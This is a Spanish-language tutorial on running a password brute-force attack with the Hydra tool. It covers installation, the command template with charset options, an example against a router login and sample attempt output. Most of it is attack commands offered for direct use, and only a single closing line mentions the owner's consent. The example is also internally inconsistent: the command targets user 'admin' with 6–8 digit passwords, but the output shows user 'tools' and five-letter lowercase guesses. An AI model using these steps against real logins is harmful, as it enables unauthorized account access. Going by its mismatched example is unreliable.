# Ataque de fuerza bruta

## Instala Hydra
Asegúrate de tener Hydra instalado en tu sistema. Puedes descargarlo desde la página oficial de Hydra o utilizar el administrador de paquetes de tu sistema operativo.

```bash
sudo apt install hydra
```

## Obten la información de destino
Antes de ejecutar el ataque, necesitas recopilar información sobre el objetivo, como el nombre de usuario o la URL del formulario de inicio de sesión.

# Ejecuta el ataque de fuerza bruta
 
Abre una terminal y ejecuta el siguiente comando:

```
hydra -l <nombre_de_usuario> -V -x <MIN>:<MAX>:<CHARSET> <dirección_del_objetivo> <protocolo>
```

- Reemplaza <nombre_de_usuario> con el nombre de usuario o lista de nombres de usuario a probar.
- Reemplaza <dirección_del_objetivo> con la dirección IP o URL del objetivo.
- Reemplaza <protocolo> con el protocolo de autenticación utilizado, como HTTP, FTP, SSH, etc.
- Remplaza \<MIN\>:\<MAX\>:\<CHARSET\> en función de la siguiente información

```
MIN     is the minimum number of characters in the password
MAX     is the maximum number of characters in the password
CHARSET is a specification of the characters to use in the generation
             valid CHARSET values are: 'a' for lowercase letters,
             'A' for uppercase letters, '1' for numbers, and for all others,
             just add their real representation.
  -y         disable the use of the above letters as placeholders
Examples:
   -x 3:5:a  generate passwords from length 3 to 5 with all lowercase letters
   -x 5:8:A1 generate passwords from length 5 to 8 with uppercase and numbers
   -x 1:3:/  generate passwords from length 1 to 3 containing only slashes
   -x 5:5:/%,.-  generate passwords with length 5 which consists only of /%,.-
   -x 3:5:aA1 -y generate passwords from length 3 to 5 with a, A and 1 only
```

Por ejemplo, si deseas realizar un ataque de fuerza bruta HTTP al formulario de inicio de sesión de un router con el nombre de usuario "admin", el comando podría ser:

```
hydra -l admin -V -x 6:8:1 http://example.com/login
```

Hydra comenzará a realizar combinaciones de contraseñas hasta encontrar la correcta o agotar todas las posibles combinaciones de los simbolos y longitudes seleccionadas.

```
[ATTEMPT] target http://example.com/login - login "tools" - pass "aaaaa" - 1 of 11881376 [child 0] (0/0)
[ATTEMPT] target http://example.com/login - login "tools" - pass "aaaab" - 2 of 11881376 [child 1] (0/0)
[ATTEMPT] target http://example.com/login - login "tools" - pass "aaaac" - 3 of 11881376 [child 2] (0/0)
[ATTEMPT] target http://example.com/login - login "tools" - pass "aaaad" - 4 of 11881376 [child 3] (0/0)
[ATTEMPT] target http://example.com/login - login "tools" - pass "aaaae" - 5 of 11881376 [child 4] (0/0)
[ATTEMPT] target http://example.com/login - login "tools" - pass "aaaaf" - 6 of 11881376 [child 5] (0/0)
[ATTEMPT] target http://example.com/login - login "tools" - pass "aaaag" - 7 of 11881376 [child 6] (0/0)
[ATTEMPT] target http://example.com/login - login "tools" - pass "aaaah" - 8 of 11881376 [child 7] (0/0)
[ATTEMPT] target http://example.com/login - login "tools" - pass "aaaai" - 9 of 11881376 [child 8] (0/0)
[ATTEMPT] target http://example.com/login - login "tools" - pass "aaaaj" - 10 of 11881376 [child 9] (0/0)
[ATTEMPT] target http://example.com/login - login "tools" - pass "aaaak" - 11 of 11881376 [child 10] (0/0)
[ATTEMPT] target http://example.com/login - login "tools" - pass "aaaal" - 12 of 11881376 [child 11] (0/0)
[ATTEMPT] target http://example.com/login - login "tools" - pass "aaaam" - 13 of 11881376 [child 12] (0/0)
[ATTEMPT] target http://example.com/login - login "tools" - pass "aaaan" - 14 of 11881376 [child 13] (0/0)
[ATTEMPT] target http://example.com/login - login "tools" - pass "aaaao" - 15 of 11881376 [child 14] (0/0)
```

# Monitorear el progreso y los resultados
Hydra mostrará el progreso y los intentos de autenticación que está realizando. Puedes monitorear la salida en tiempo real y ver si se encuentra una coincidencia de contraseña exitosa.

Recuerda que es importante realizar este tipo de actividad solo con el consentimiento del propietario del sistema o con fines educativos legítimos.
